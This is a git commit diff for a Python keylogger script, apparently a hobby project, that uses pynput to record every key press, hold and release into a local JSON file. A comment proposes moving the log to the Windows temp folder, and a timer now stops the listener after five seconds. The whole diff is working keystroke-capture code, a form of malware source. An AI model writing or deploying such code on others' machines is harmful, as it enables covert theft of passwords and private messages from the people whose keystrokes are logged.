3d0a433f3022ea0d533baeb9c6104cc811153421
Daniel Lima <danielmlimag@gmail.com>
2021-11-29 19:28:02 -0300

    feat: add screenlogger script and add timer to keylogger code

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,12 @@
 from pynput import keyboard
 import json
+from threading import Timer
 
 key_list = []
 x = False  # Value to if held
 
 
+# Trocar para C:\Windows\Temp\logs.json
 def update_json_file(key_list):
     with open('logs.json', '+wb') as key_log:
         key_list_bytes = json.dumps(key_list).encode()
@@ -17,27 +19,23 @@ def on_press(key):
         key_list.append({'Pressed': f'{key}'})
         x = True
     if x == True:
-        key_list.append(
-            {'Held': f'{key}'}
-            # f'Key {key} pressed'
-        )
+        key_list.append({'Held': f'{key}'})  # f'Key {key} pressed'
     update_json_file(key_list)
 
 
 def on_release(key):
     global x, key_list
-    key_list.append(
-        {'Released': f'{key}'}
-        # f'Key {key} released'
-    )
+    key_list.append({'Released': f'{key}'})  # f'Key {key} released'
     if x == True:
         x = False
     update_json_file(key_list)
 
 
-print("[+] Keylogger funcionando com sucesso!\n[!] Salvando dados no arquivo 'logs.json'")
+print(
+    "[+] Keylogger funcionando com sucesso!\n[!] Salvando dados no arquivo 'logs.json'"
+)
 
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    Timer(5, listener.stop).start()
     listener.join()
+    print("[-] Keylogger finalizado!")
